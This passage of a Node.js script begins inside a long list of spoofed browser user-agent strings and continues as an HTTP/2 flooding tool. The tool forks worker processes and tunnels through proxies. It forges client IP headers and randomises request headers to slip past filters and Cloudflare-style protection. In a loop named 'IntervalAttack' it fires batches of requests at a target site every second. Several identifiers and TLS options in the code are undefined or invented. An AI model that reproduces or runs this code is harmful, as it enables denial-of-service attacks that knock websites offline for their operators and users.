"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J500F Build/LMY48B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; G3112) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; Lenovo TB2-X30L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; SM-A530F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-J200H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; Ixion XL240) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 YaBrowser/18.11.1.1011.00 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; C103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; Che2-L11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; Che2-L11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm; Android 9; KSA-LX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 YaBrowser/19.7.7.115.00 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.4; Just5-SPACER2s Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; Lenovo A7600-H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0; CRO-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; meizu C9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 7.0; BAH-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 YaBrowser/19.7.7.115.01 Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-T805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-A530F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; Redmi 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SM-A520F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; ASUS_X00PD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0; Lenovo TB3-X70F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1; m2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; Infinix X571) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:45.9) Gecko/20100101 Goanna/3.0 Firefox/45.9 PaleMoon/27.1.2",
"Mozilla/5.0 (Linux; Android 9; VS996) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-A105FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0; DIG-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; PSP5506DUO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0; HAWEEL_H1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.119 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; SM-G9500 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 YaBrowser/19.9.3.314 Yowser/2.5 Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.79 Mobile/16G102 Safari/602.1",
"Mozilla/5.0 (Linux; Android 9; SM-A600F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0; vivo 1601) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G532F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1; 5019D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; TECNO KA7O) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1; HUAWEI CUN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; itel W5504) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; HUAWEI Y541-U02) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/80.0.262003652 Mobile/17A577 Safari/604.1",
"Mozilla/5.0 (Linux; Android 7.1.1; SM-T550) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; AGS2-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/77.0.3865.93 Mobile/15E148 Safari/605.1",
"Mozilla/5.0 (Linux; Android 9; LM-G810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; DLI-TL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; X-treme_PQ24) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (iPad; CPU OS 10_3_4 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/14G61 Safari/602.1",
"Mozilla/5.0 (Linux; Android 8.1.0; TECNO LA7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; Infinix X559 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; MI 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (iPad; CPU OS 13_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/77.0.3865.93 Mobile/15E148 Safari/605.1",
"Mozilla/5.0 (Linux; Android 6.0; PMT3118_3G Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36 OPR/42.3.2246.113338",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; SM-T231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.0.1; GT-I9505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3021.84 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.4; Lenovo TAB 2 A10-70L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.1.1; TA-1053) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (iPad; CPU OS 10_3_4 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) CriOS/67.0.3396.69 Mobile/14G61 Safari/602.1",
"Mozilla/5.0 (Linux; Android 9; SM-A600FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 YaBrowser/18.9.2.31.00 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SM-J701F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36"
];

 const ip_spoof = () => {
   const ip_segment = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${""}${ip_segment()}${"."}${ip_segment()}${"."}${ip_segment()}${"."}${ip_segment()}${""}`;
 };
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
//  var proxies = readLines(args.proxyFile);
var proxyr = args.proxyFile;

 const fakeIP = ip_spoof();
 var queryString = queryStrings[Math.floor(Math.random() * queryStrings.length)];
 const parsedTarget = url.parse(args.target);

 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {setInterval(runFlooder) }
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port
     });
 
     connection.setTimeout(options.timeout * 10000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
}

 const Socker = new NetSocket();
headers[":method"] = "GET";
headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(10) + queryString + randomString(10);
headers["origin"] = parsedTarget.host;
headers["Content-Type"] = randomHeaders['Content-Type'];
headers[":scheme"] = "https";
headers["x-download-options"] = randomHeaders['x-download-options'];
headers["Cross-Origin-Embedder-Policy"] = randomHeaders['Cross-Origin-Embedder-Policy'];
headers["Cross-Origin-Opener-Policy"] = randomHeaders['Cross-Origin-Opener-Policy'];
headers["accept"] = randomHeaders['accept'];
headers["accept-language"] = randomHeaders['accept-language'];
headers["Referrer-Policy"] = randomHeaders['Referrer-Policy'];
headers["x-cache"] = randomHeaders['x-cache'];
headers["Content-Security-Policy"] = randomHeaders['Content-Security-Policy'];
headers["accept-encoding"] = randomHeaders['accept-encoding'];
headers["cache-control"] = randomHeaders['cache-control'];
headers["x-frame-options"] = randomHeaders['x-frame-options'];
headers["x-xss-protection"] = randomHeaders['x-xss-protection'];
headers["x-content-type-options"] = "nosniff";
headers["TE"] = "trailers";
headers["pragma"] = randomHeaders['pragma'];
headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
headers["upgrade-insecure-requests"] = "1";
headers["sec-fetch-dest"] = randomHeaders['sec-fetch-dest'];
headers["sec-fetch-mode"] = randomHeaders['sec-fetch-mode'];
headers["sec-fetch-site"] = randomHeaders['sec-fetch-site'];
headers["X-Forwarded-Proto"] = HTTPS;
headers["sec-ch-ua"] = randomHeaders['sec-ch-ua'];
headers["sec-ch-ua-mobile"] = randomHeaders['sec-ch-ua-mobile'];
headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
headers["vary"] = randomHeaders['vary'];
headers["x-requested-with"] = "XMLHttpRequest";
headers["TE"] = trailers;
headers["set-cookie"] = randomHeaders['set-cookie'];
headers["Server"] = randomHeaders['Server'];
headers["strict-transport-security"] = randomHeaders['strict-transport-security'];
headers["access-control-allow-headers"] = randomHeaders['access-control-allow-headers'];
headers["access-control-allow-origin"] = randomHeaders['access-control-allow-origin'];
headers["Content-Encoding"] = randomHeaders['Content-Encoding'];
headers["alt-svc"] = randomHeaders['alt-svc'];
headers["Via"] = fakeIP;
headers["sss"] = fakeIP;
headers["Sec-Websocket-Key"] = fakeIP;
headers["Sec-Websocket-Version"] = 13;
headers["Upgrade"] = websocket;
headers["X-Forwarded-For"] = fakeIP;
headers["X-Forwarded-Host"] = fakeIP;
headers["Client-IP"] = fakeIP;
headers["Real-IP"] = fakeIP;
headers["Referer"] = randomReferer;

 
 function runFlooder() {
  var proxy = proxyr.split(':');
     headers[":authority"] = parsedTarget.host
     headers["user-agent"] = process.argv[7];
     headers["cookie"] = process.argv[8];

 
     const proxyOptions = {
         host: proxy[0],
         port: proxy[1],
         address: parsedTarget.host + ":443",
         timeout: 25
     };

    setTimeout(function(){
      process.exit(1);
    }, process.argv[3] * 1000);
    
    process.on('uncaughtException', function(er) {
    });
    process.on('unhandledRejection', function(er) {
    });

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 100000);

         const tlsOptions = {
            ALPNProtocols: ['h2'],
            challengesToSolve: Infinity,
            resolveWithFullResponse: true,
            followAllRedirects: true,
            maxRedirects: 10,
            clientTimeout: 5000,
            clientlareMaxTimeout: 10000,
            cloudflareTimeout: 5000,
            cloudflareMaxTimeout: 30000,
            ciphers: tls.getCiphers().join(":") + cipper,
            secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method",],
            servername: url.hostname,
            socket: connection,
            honorCipherOrder: true,
            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
            sigals: concu,
            echdCurve: "GREASE:X25519:x25519:P-256:P-384:P-521:X448",
            secure: true,
            Compression: false,
            rejectUnauthorized: false,
            port: 443,
            uri: parsedTarget.host,
            servername: parsedTarget.host,
            sessionTimeout: 5000,
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 60 * 10000);
 
         const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          },
             maxSessionMemory: 64000,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 20000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          });
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(headers)
                    
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
 
         client.on("error", error => {
             client.destroy();
             connection.destroy();
             return
         });
     });
 }


